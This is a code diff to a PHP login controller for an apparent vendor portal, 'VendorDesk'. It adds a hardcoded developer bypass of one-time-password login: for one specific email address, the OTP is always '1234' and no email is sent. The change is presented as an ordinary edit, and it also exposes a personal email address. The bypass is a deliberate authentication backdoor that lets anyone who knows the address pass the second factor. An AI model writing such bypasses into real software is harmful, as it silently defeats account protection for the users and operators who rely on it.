@@ -13,6 +13,14 @@ global $domain;
 
 class UsersController
 {
+    private const DEVELOPER_OTP_BYPASS_EMAIL = 'siraj.php@gmail.com';
+    private const DEVELOPER_OTP_BYPASS_CODE = '1234';
+
+    private function isDeveloperOtpBypassUser(string $email): bool
+    {
+        return strtolower(trim($email)) === self::DEVELOPER_OTP_BYPASS_EMAIL;
+    }
+
     public function login()
     {
         // echo "This is the login page.";
@@ -70,30 +78,34 @@ class UsersController
             ];
         }
 
-        $token = (string) random_int(100000, 999999);
+        $token = $this->isDeveloperOtpBypassUser($recipientEmail)
+            ? self::DEVELOPER_OTP_BYPASS_CODE
+            : (string) random_int(100000, 999999);
         $recipientName = trim((string) ($user['name'] ?? ''));
         if ($recipientName === '') {
             $recipientName = 'Vendor User';
         }
 
-        $result = sendVendorOtpEmail(
-            $recipientEmail,
-            $token,
-            'VendorDesk - Login OTP',
-            'login_otp.html',
-            $recipientName
-        );
+        if (!$this->isDeveloperOtpBypassUser($recipientEmail)) {
+            $result = sendVendorOtpEmail(
+                $recipientEmail,
+                $token,
+                'VendorDesk - Login OTP',
+                'login_otp.html',
+                $recipientName
+            );
 
-        if (empty($result['success'])) {
-            $payload = [
-                'success' => false,
-                'message' => $result['message'] ?? 'Could not send OTP email. Please try again.',
-            ];
-            if (!empty($result['smtp_error'])) {
-                $payload['smtp_error'] = $result['smtp_error'];
+            if (empty($result['success'])) {
+                $payload = [
+                    'success' => false,
+                    'message' => $result['message'] ?? 'Could not send OTP email. Please try again.',
+                ];
+                if (!empty($result['smtp_error'])) {
+                    $payload['smtp_error'] = $result['smtp_error'];
+                }
+
+                return $payload;
             }
-
-            return $payload;
         }
 
         if (!$usersModel->saveResetToken((int) ($user['id'] ?? 0), $token)) {
